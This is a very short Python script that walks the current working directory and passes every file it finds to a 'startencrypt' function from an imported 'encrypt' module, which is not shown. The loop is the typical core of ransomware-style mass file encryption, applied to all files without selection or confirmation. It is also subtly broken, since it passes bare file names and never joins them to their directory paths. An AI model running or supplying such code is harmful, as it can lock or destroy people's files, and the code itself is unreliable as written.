import os
import encrypt as e
for root,dir,files in os.walk(os.getcwd()):
   for file in files:
       e.startencrypt(file)
    